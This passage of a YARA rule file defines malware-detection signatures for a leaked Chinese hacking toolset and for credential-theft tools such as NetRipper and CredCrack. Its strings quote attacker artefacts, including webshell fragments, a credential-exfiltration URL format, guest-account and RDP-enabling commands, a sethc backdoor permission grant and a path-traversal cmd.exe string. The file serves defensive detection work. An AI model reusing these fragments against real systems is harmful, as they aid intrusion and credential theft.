		uint16(0) == 0x5a4d and filesize < 8110KB and all of them
}

rule CN_Honker_WebScan_WebScan {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file WebScan.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "a0b0e2422e0e9edb1aed6abb5d2e3d156b7c8204"
	strings:
		$s1 = "wwwscan.exe" fullword wide
		$s2 = "WWWScan Gui" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 700KB and all of them
}

rule CN_Honker_GetHashes_2 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file GetHashes.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "35ae9ccba8d607d8c19a065cf553070c54b091d8"
	strings:
		$s1 = "GetHashes.exe <SAM registry file> [System key file]" fullword ascii
		$s2 = "GetHashes.exe $Local" fullword ascii
		$s3 = "The system key doesn't match SAM registry file!" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and 2 of them
}

rule Generic_KeyGen_Patcher {
	meta:
		description = "Keygen from CN Honker Pentest Toolset - file Acunetix_Web_Vulnerability_Scanner_8.x_Enterprise_Edition_KeyGen.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 50
		hash = "e32f5de730e324fb386f97b6da9ba500cf3a4f8d"
	strings:
		$s1 = "<description>Patch</description>" fullword ascii
		$s2 = "\\dup2patcher.dll" fullword ascii
		$s3 = "load_patcher" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 4000KB and all of them
}

rule CN_Honker_Tuoku_script_oracle_2 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file oracle.txt"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "865dd591b552787eda18ee0ab604509bae18c197"
	strings:
		$s0 = "webshell" fullword ascii
		$s1 = "Silic Group Hacker Army " fullword ascii
	condition:
		filesize < 3KB and all of them
}

rule CN_Honker_net_packet_capt {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file net_packet_capt.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "2d45a2bd9e74cf14c1d93fff90c2b0665f109c52"
	strings:
		$s1 = "(*.sfd)" fullword ascii
		$s2 = "GetLaBA" fullword ascii
		$s3 = "GAIsProcessorFeature" fullword ascii  /* Goodware String - occured 1 times */
		$s4 = "- Gablto " ascii
		$s5 = "PaneWyedit" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 50KB and all of them
}

rule CN_Honker_CleanIISLog {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file CleanIISLog.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "827cd898bfe8aa7e9aaefbe949d26298f9e24094"
	strings:
		$s1 = "Usage: CleanIISLog <LogFile>|<.> <CleanIP>|<.>" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and all of them
}

rule CN_Honker_HASH_pwhash {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file pwhash.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "689056588f95749f0382d201fac8f58bac393e98"
	strings:
		$s1 = "Example: quarks-pwdump.exe --dump-hash-domain --with-history" fullword ascii
		$s2 = "quarks-pwdump.exe <options> <NTDS file>" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them
}

rule CN_Honker_cleaner_cl_2 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file cl.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "523084e8975b16e255b56db9af0f9eecf174a2dd"
	strings:
		$s0 = "cl -eventlog All/Application/System/Security" fullword ascii
		$s1 = "clear iislog error!" fullword ascii
	condition:
		uint16(0) == 0x5a4d and all of them
}

rule CN_Honker_SqlMap_Python_Run {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Run.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "a51479a1c589f17c77d22f6cf90b97011c33145f"
	strings:
		$s1 = ".\\Run.log" fullword ascii
		$s2 = "[root@Hacker~]# Sqlmap " fullword ascii
		$s3 = "%sSqlmap %s" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 30KB and all of them
}

rule CN_Honker_SAMInside {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file SAMInside.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "707ba507f9a74d591f4f2e2f165ff9192557d6dd"
	strings:
		$s0 = "www.InsidePro.com" fullword wide
		$s1 = "SAMInside.exe" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 650KB and all of them
}

rule CN_Honker_WebScan_wwwscan {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file wwwscan.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "6dbffa916d0f0be2d34c8415592b9aba690634c7"
	strings:
		$s1 = "%s www.target.com -p 8080 -m 10 -t 16" fullword ascii
		$s2 = "GET /nothisexistpage.html HTTP/1.1" fullword ascii
		$s3 = "<Usage>:  %s <HostName|Ip> [Options]" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 60KB and all of them
}

rule CN_Honker_sig_3389_2_3389 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file 3389.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "48d1974215e5cb07d1faa57e37afa91482b5a376"
	strings:
		$s1 = "C:\\Documents and Settings\\Administrator\\" fullword ascii
		$s2 = "net user guest /active:yes" fullword ascii
		$s3 = "\\Microsoft Word.exe" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 80KB and all of them
}

rule CN_Honker_PHP_php11 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file php11.txt"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "dcc8226e7eb20e4d4bef9e263c14460a7ee5e030"
	strings:
		$s1 = "<tr><td><b><?php if (!$win) {echo wordwrap(myshellexec('id'),90,'<br>',1);} else" ascii
		$s2 = "foreach (glob($_GET['pathtomass'].\"/*.htm\") as $injectj00) {" fullword ascii
		$s3 = "echo '[cPanel Found] '.$login.':'.$pass.\"  Success\\n\";" fullword ascii
	condition:
		filesize < 800KB and all of them
}

rule CN_Honker_WebCruiserWVS {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file WebCruiserWVS.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "6c90a9ed4c8a141a343dab1b115cc840a7190304"
	strings:
		$s0 = "id:uid:user:username:password:access:account:accounts:admin_id:admin_name:admin_" ascii
		$s1 = "Created By WebCruiser - Web Vulnerability Scanner http://sec4app.com" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 700KB and all of them
}

rule CN_Honker_Hookmsgina {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Hookmsgina.dll"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "f4d9b329b45fbcf6a3b9f29f2633d5d3d76c9f9d"
	strings:
		$s1 = "\\\\.\\pipe\\WinlogonHack" fullword ascii
		$s2 = "%s?host=%s&domain=%s&user=%s&pass=%s&port=%u" fullword ascii
		$s3 = "Global\\WinlogonHack_Load%u" fullword ascii
		$s4 = "Hookmsgina.dll" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule CN_Honker_sig_3389_xp3389 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file xp3389.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "d776eb7596803b5b94098334657667d34b60d880"
	strings:
		$s1 = "echo \"fdenytsconnections\"=dword:00000000 >> c:\\reg.reg" fullword ascii
		$s2 = "echo [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server] >" ascii
		$s3 = "echo \"Tsenabled\"=dword:00000001 >> c:\\reg.reg" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 20KB and all of them
}

rule CN_Honker_CookiesView {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file CookiesView.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "c54e1f16d79066edfa0f84e920ed1f4873958755"
	strings:
		$s0 = "V1.0  Http://www.darkst.com Code:New4" fullword ascii
		$s1 = "maotpo@126.com" fullword ascii
		$s2 = "www.baidu.com" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 640KB and all of them
}

rule CN_Honker_T00ls_Lpk_Sethc_v4_LPK {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file LPK.DAT"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "2b2ab50753006f62965bba83460e3960ca7e1926"
	strings:
		$s1 = "http://127.0.0.1/1.exe" fullword wide
		$s2 = "FreeHostKillexe.exe" fullword ascii
		$s3 = "\\sethc.exe /G everyone:F" fullword ascii
		$s4 = "c:\\1.exe" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and 1 of them
}

rule CN_Honker_ScanHistory {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file ScanHistory.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "14c31e238924ba3abc007dc5a3168b64d7b7de8d"
	strings:
		$s1 = "ScanHistory.exe" fullword wide
		$s2 = ".\\Report.dat" fullword wide
		$s3 = "select  * from  Results order by scandate desc" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and all of them
}

rule CN_Honker_InvasionErasor {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file InvasionErasor.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "b37ecd9ee6b137a29c9b9d2801473a521b168794"
	strings:
		$s1 = "c:\\windows\\system32\\config\\*.*" fullword wide
		$s2 = "c:\\winnt\\*.txt" fullword wide /* PEStudio Blacklist: os */
		$s3 = "Command1" fullword ascii
		$s4 = "Win2003" fullword ascii /* PEStudio Blacklist: os */
		$s5 = "Win 2000" fullword ascii /* PEStudio Blacklist: os */
	condition:
		uint16(0) == 0x5a4d and filesize < 60KB and all of them
}

rule CN_Honker_super_Injection1 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file super Injection1.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "8ff2df40c461f6c42b92b86095296187f2b59b14"
	strings:
		$s2 = "Invalid owner=This control requires version 4.70 or greater of COMCTL32.DLL" fullword wide
		$s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii /* PEStudio Blacklist: agent */
		$s4 = "ScanInject.log" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and all of them
}

rule CN_Honker_Pk_Pker {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Pker.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "631787f27f27c46f79e58e1accfcc9ecfb4d3a2f"
	strings:
		$s1 = "/msadc/..%5c..%5c..%5c..%5cwinnt/system32/cmd.exe" fullword wide
		$s2 = "msadc/..\\..\\..\\..\\winnt/system32/cmd.exe" fullword wide
		$s3 = "--Made by VerKey&Only_Guest&Bincker" fullword wide
		$s4 = ";APPLET;EMBED;FRAMESET;HEAD;NOFRAMES;NOSCRIPT;OBJECT;SCRIPT;STYLE;" fullword wide
		$s5 = " --Welcome to Www.Pker.In Made by V.K" fullword wide
		$s6 = "Report.dat" fullword wide
		$s7 = ".\\Report.dat" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and 5 of them
}

rule CN_Honker_GetPass_GetPass {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file GetPass.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "d18d952b24110b83abd17e042f9deee679de6a1a"
	strings:
		$s1 = "\\only\\Desktop\\" ascii
		$s2 = "To Run As Administuor" ascii
		$s3 = "Key to EXIT ... & pause > nul" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule CN_Honker_F4ck_Team_f4ck_3 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file f4ck.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "7e3bf9b26df08cfa10f10e2283c6f21f5a3a0014"
	strings:
		$s1 = "File UserName PassWord [comment] /add" fullword ascii
		$s2 = "No Net.exe Add User" fullword ascii
		$s3 = "BlackMoon RunTime Error:" fullword ascii
		$s4 = "Team.F4ck.Net" fullword wide
		$s5 = "admin 123456789" fullword ascii
		$s6 = "blackmoon" fullword ascii
		$s7 = "f4ck Team" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 4 of them
}

rule CN_Honker_F4ck_Team_F4ck_3 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file F4ck_3.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "0b3e9381930f02e170e484f12233bbeb556f3731"
	strings:
		$s1 = "F4ck.exe" fullword wide
		$s2 = "@Netapi32.dll" fullword ascii
		$s3 = "Team.F4ck.Net" fullword wide
		$s6 = "NO Net Add User" fullword wide
		$s7 = "DLL ERROR" fullword ascii
		$s11 = "F4ck Team" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 3 of them
}

rule CN_Honker_ACCESS_brute {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file ACCESS_brute.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "f552e05facbeb21cb12f23c34bb1881c43e24c34"
	strings:
		$s1 = ".dns166.co" ascii
		$s2 = "SExecuteA" ascii
		$s3 = "ality/clsCom" ascii
		$s4 = "NT_SINK_AddRef" ascii
		$s5 = "WINDOWS\\Syswm" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 20KB and all of them
}

rule CN_Honker_Fpipe_FPipe {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file FPipe.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 50
		hash = "a2c51c6fa93a3dfa14aaf31fb1c48a3a66a32d11"
	strings:
		$s1 = "Unable to create TCP listen socket. %s%d" fullword ascii
		$s2 = "http://www.foundstone.com" fullword ascii
		$s3 = "%s %s port %d. Address is already in use" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 20KB and all of them
}

rule CN_Honker_Layer_Layer {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Layer.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "0f4f27e842787cb854bd61f9aca86a63f653eb41"
	strings:
		$s1 = "\\Release\\Layer.pdb" fullword ascii
		$s2 = "Layer.exe" fullword wide
		$s3 = "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule CN_Honker_ms10048_x86 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file ms10048-x86.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "e57b453966e4827e2effa4e153f2923e7d058702"
	strings:
		$s1 = "[+] Set to %d exploit half succeeded" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 30KB and all of them
}

rule CN_Honker_HTran2_4 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file HTran2.4.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "524f986692f55620013ab5a06bf942382e64d38a"
	strings:
		$s1 = "Enter Your Socks Type No: [0.BindPort 1.ConnectBack 2.Listen]:" fullword ascii
		$s2 = "[+] New connection %s:%d !!" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 180KB and all of them
}

rule CN_Honker_SkinHRootkit_SkinH {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file SkinH.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "d593f03ae06e54b653c7850c872c0eed459b301f"
	strings:
		$s0 = "(C)360.cn Inc.All Rights Reserved." fullword wide
		$s1 = "SDVersion.dll" fullword wide
		$s2 = "skinh.dll" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and all of them
}

rule CN_Honker__PostgreSQL_mysql_injectV1_1_Creak_Oracle_SQLServer_inject_Creaked {
	meta:
		description = "Sample from CN Honker Pentest Toolset - from files PostgreSQL.exe, mysql_injectV1.1_Creak.exe, Oracle.exe, SQLServer_inject_Creaked.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		super_rule = 1
		hash0 = "1ecfaa91aae579cfccb8b7a8607176c82ec726f4"
		hash1 = "a1f066789f48a76023598c5777752c15f91b76b0"
		hash2 = "0264f4efdba09eaf1e681220ba96de8498ab3580"
		hash3 = "af3c41756ec8768483a4cf59b2e639994426e2c2"
	strings:
		$s1 = "zhaoxypass@yahoo.com.cn" fullword ascii
		$s2 = "Mozilla/3.0 (compatible; Indy Library)" fullword ascii
		$s3 = "ProxyParams.ProxyPort" fullword ascii
	condition:
		uint16(0) == 0x5a4d and all of them
}

rule Suspicious_Func_Set {
	meta:
		description = "Generic rule for a suspicious function set used in various hack tools"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 30
		super_rule = 1
		hash0 = "a1f066789f48a76023598c5777752c15f91b76b0"
		hash1 = "6fb6b9d8eb15da3ceabb8cc030eb1bf0fe743485"
		hash2 = "8ff2df40c461f6c42b92b86095296187f2b59b14"
	strings:
		$s1 = "Dark Teal" fullword wide
		$s2 = "TRzFrameControllerProperty" fullword ascii
		$s3 = "hkeyLocalMachine" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}

rule CN_Honker__wwwscan_wwwscan_wwwscan_gui {
	meta:
		description = "Sample from CN Honker Pentest Toolset - from files wwwscan.exe, wwwscan.exe, wwwscan_gui.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		super_rule = 1
		hash0 = "6dbffa916d0f0be2d34c8415592b9aba690634c7"
		hash1 = "6bed45629c5e54986f2d27cbfc53464108911026"
		hash2 = "897b66a34c58621190cb88e9b2a2a90bf9b71a53"
	strings:
		$s1 = "GET /nothisexistpage.html HTTP/1.1" fullword ascii
		$s2 = "<Usage>:  %s <HostName|Ip> [Options]" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and all of them
}

rule CN_Honker__LPK_LPK_LPK {
	meta:
		description = "Sample from CN Honker Pentest Toolset - from files LPK.DAT, LPK.DAT, LPK.DAT"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		super_rule = 1
		hash0 = "5a1226e73daba516c889328f295e728f07fdf1c3"
		hash1 = "2b2ab50753006f62965bba83460e3960ca7e1926"
		hash2 = "cf2549bbbbdb7aaf232d9783873667e35c8d96c1"
	strings:
		$s1 = "C:\\WINDOWS\\system32\\cmd.exe" fullword wide
		$s2 = "Password error!" fullword ascii
		$s3 = "\\sathc.exe" fullword ascii
		$s4 = "\\sothc.exe" fullword ascii
		$s5 = "\\lpksethc.bat" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1057KB and all of them
}

rule CN_Honker__builder_shift_SkinH {
	meta:
		description = "Sample from CN Honker Pentest Toolset - from files builder.exe, shift.exe, SkinH.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		super_rule = 1
		hash0 = "6b5a84cdc3d27c435d49de3f68872d015a5aadfc"
		hash1 = "ee127c1ea1e3b5bf3d2f8754fabf9d1101ed0ee0"
		hash2 = "d593f03ae06e54b653c7850c872c0eed459b301f"
	strings:
		$s1 = "lipboard" fullword ascii
		$s2 = "uxthem" fullword ascii
		$s3 = "ENIGMA" fullword ascii
		$s4 = "UtilW0ndow" fullword ascii
		$s5 = "prog3am" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 6075KB and all of them
}

rule CN_Honker__lcx_HTran2_4_htran20 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - from files lcx.exe, HTran2.4.exe, htran20.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		super_rule = 1
		hash0 = "0c8779849d53d0772bbaa1cedeca150c543ebf38"
		hash1 = "524f986692f55620013ab5a06bf942382e64d38a"
		hash2 = "b992bf5b04d362ed3757e90e57bc5d6b2a04e65c"
	strings:
		$s1 = "[SERVER]connection to %s:%d error" fullword ascii
		$s2 = "[+] OK! I Closed The Two Socket." fullword ascii
		$s3 = "[+] Start Transmit (%s:%d <-> %s:%d) ......" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 440KB and all of them
}

rule CN_Honker__D_injection_V2_32_D_injection_V2_32_D_injection_V2_32 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - from files D_injection_V2.32.exe, D_injection_V2.32.exe, D_injection_V2.32.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		super_rule = 1
		hash0 = "3a000b976c79585f62f40f7999ef9bdd326a9513"
		hash1 = "3a000b976c79585f62f40f7999ef9bdd326a9513"
		hash2 = "3a000b976c79585f62f40f7999ef9bdd326a9513"
	strings:
		$s1 = "upfile.asp " fullword ascii
		$s2 = "[wscript.shell]" fullword ascii
		$s3 = "XP_CMDSHELL" fullword ascii
		$s4 = "[XP_CMDSHELL]" fullword ascii
		$s5 = "http://d99net.3322.org" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 10000KB and 4 of them
}

rule EvilWMIProvider {
	meta:
		description = "EvilWMIProvider Installs And Executes Shellcode - file EvilWMIProvider.dll"
		author = "Florian Roth"
		reference = "https://goo.gl/EisLJ7"
		date = "2015-07-14"
		score = 70
		hash = "250a5f13f6085509fa331f560e354e8ef5bb3dfa2cc67f4b182a9cd1246cbe82"
	strings:
		$s1 = "EvilWMIProvider.dll" fullword wide
		$s2 = "ExecShellCode" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "Hello, World!" fullword wide /* PEStudio Blacklist: strings */
		$s4 = "EvilInstall" fullword ascii /* PEStudio Blacklist: strings */
		$s5 = "root\\cimv2:Win32_Evil" fullword wide
		$s6 = "<DoEvil>d__0" fullword ascii
		$s7 = "EvilWMIProvider" fullword wide
		$s8 = "Win32_Evil" fullword ascii
		$s9 = "DoEvil" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 20KB and 3 of them
}

rule AppInitHook {
	meta:
		description = "AppInitGlobalHooks-Mimikatz - Hide Mimikatz From Process Lists - file AppInitHook.dll"
		author = "Florian Roth"
		reference = "https://goo.gl/Z292v6"
		date = "2015-07-15"
		score = 70
		hash = "e7563e4f2a7e5f04a3486db4cefffba173349911a3c6abd7ae616d3bf08cfd45"
	strings:
		$s0 = "\\Release\\AppInitHook.pdb" ascii
		$s1 = "AppInitHook.dll" fullword ascii
		$s2 = "mimikatz.exe" fullword wide
		$s3 = "]X86Instruction->OperandSize >= Operand->Length" fullword wide
		$s4 = "mhook\\disasm-lib\\disasm.c" fullword wide
		$s5 = "mhook\\disasm-lib\\disasm_x86.c" fullword wide
		$s6 = "VoidFunc" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and 4 of them
}

rule credcrack_compiled_py {
    meta:
        description = "Credential harvester via Mimikatz - file credcrack.exe"
        author = "Florian Roth"
        reference = "https://github.com/gojhonny/CredCrack"
        date = "2015-08-12"
        score = 70
        hash1 = "9c884f4c879f03b0ad1c9959e4989517515d3d3fd770bb0acfd256d79fa0e283"
        hash2 = "a266e9034b775823d468f4616c972282aec71cd693195fc1fac0f382e43ee895"
    strings:
        $s1 = "bpython27.dll" fullword ascii
        $s2 = "bcredcrack.exe.manifest" fullword ascii
    condition:
        uint16(0) == 0x5a4d and filesize < 8000KB and all of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-08-14
	Identifier: NetRipper
*/

/* Rule Set ----------------------------------------------------------------- */

rule NetRipper_Release_DLL {
	meta:
		description = "Auto-generated rule - file DLL.dll"
		author = "Florian Roth"
		reference = "https://github.com/NytroRST/NetRipper"
		date = "2015-08-14"
		score = 80
		hash = "56ab742b04c7ac62671f6d54dc67b471865b1a125999cc05e7c0a02095ba9bd2"
	strings:
		$x1 = "NetRipper\\Release\\DLL.pdb" fullword ascii
		$x2 = "NetRipperLog.txt" fullword ascii
		$x3 = "<NetRipper><plaintext>true" ascii

		$s1 = "[ERROR] Cannot get current process modules, searching for: " fullword ascii
		$s2 = "chrome.dll" fullword ascii
		$s3 = "SslEncryptPacket.txt" fullword ascii
		$s4 = "user,login,pass,database,config" fullword ascii
		$s5 = "[ERROR] GetModuleSection did not find the section: " fullword ascii
		$s6 = "[ERROR] Cannot get hook by original address: " fullword ascii
		$s7 = "DLL.dll" fullword ascii
		$s8 = "[ERROR] Cannot get modules snapshot!" fullword ascii
		$s9 = "[ERROR] Cannot get Chrome MOV string!" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 600KB and 1 of ($x*) or 6 of ($s*)
}

rule NetRipper_Win {
	meta:
		description = "Auto-generated rule - file NetRipper.exe"
		author = "Florian Roth"
		reference = "https://github.com/NytroRST/NetRipper"
		date = "2015-08-14"
		score = 80
		hash = "6fda1bbdb55a13890f15bee6287c05343ecde4d67896f3d022e54974604281dc"
	strings:
		$s0 = "Injection: NetRipper.exe DLLpath.dll processname.exe" fullword ascii
		$s1 = "NetRipper\\Release\\NetRipper.pdb" fullword ascii
		$s2 = "Example: NetRipper.exe -w DLL.dll -l TEMP -p true -d 4096 -s user,pass" fullword ascii
		$s3 = "Failed to inject the DLL in process: " fullword ascii
		$s5 = "Error: Cannot get LoadLibrary address to inject the DLL!" fullword ascii
		$s6 = "Error: Cannot allocate memory for DLL name in remote process!" fullword ascii
		$s7 = "Error: Cannot create remote thread to inject DLL!" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and 2 of them
}

rule netripper {
	meta:
		description = "Auto-generated rule - file netripper.rb"
		author = "Florian Roth"
		reference = "https://github.com/NytroRST/NetRipper"
		date = "2015-08-14"
		score = 80
		hash = "cc1101888adfab6581e57a7cae6fe1b7dae876467e0fd4098cfbad3261261eb7"
	strings:
		$s1 = "command_line = \"/usr/share/metasploit-framework/modules/post/windows/gather/netripper/netripper -w /usr/share/metasploit-framew" ascii
		$s2 = "dllpath = '/usr/share/metasploit-framework/modules/post/windows/gather/netripper/NewDLL.dll'" fullword ascii
		$s3 = "OptString.new('DATAPATH',     [ false, 'Where to save files. E.g. C:\\\\Windows\\\\Temp or TEMP', 'TEMP' ])," fullword ascii
		$s4 = "require 'msf/core/post/windows/reflective_dll_injection'" fullword ascii
	condition:
		2 of them
}

rule netripper_3 {
	meta:
		description = "Auto-generated rule - file netripper"
		author = "Florian Roth"
		reference = "https://github.com/NytroRST/NetRipper"
		date = "2015-08-14"
		score = 80
		hash = "0a8dc2053dfc3c7f7ebb4e0bbdeb63371ddddc19e7adcdfab17947453472ea95"
	strings:
		$s1 = "/usr/share/metasploit-framework/modules/post/windows/gather/netripper/NewDLL.dll" fullword ascii
		$s2 = "Example: ./netripper -w DLL.dll -l TEMP -p true -d 4096 -s user,pass" fullword ascii
		$s3 = "-s,  --stringfinder  Find specific strings. E.g. user,pass,config" fullword ascii
	condition:
		all of them
}

/* Super Rules ------------------------------------------------------------- */

rule NetRipper_Generic {
	meta:
		description = "Auto-generated rule - from files NetRipper.exe, netripper"
		author = "Florian Roth"
		reference = "https://github.com/NytroRST/NetRipper"
		date = "2015-08-14"
		score = 80
		super_rule = 1
		hash1 = "6fda1bbdb55a13890f15bee6287c05343ecde4d67896f3d022e54974604281dc"
		hash2 = "0a8dc2053dfc3c7f7ebb4e0bbdeb63371ddddc19e7adcdfab17947453472ea95"
	strings:
		$s1 = "Cannot write first chunk to temporary DLL file: " fullword ascii
		$s2 = "DLL succesfully created: " fullword ascii
		$s3 = "<NetRipper>" fullword ascii
	condition:
		all of them
}

/*
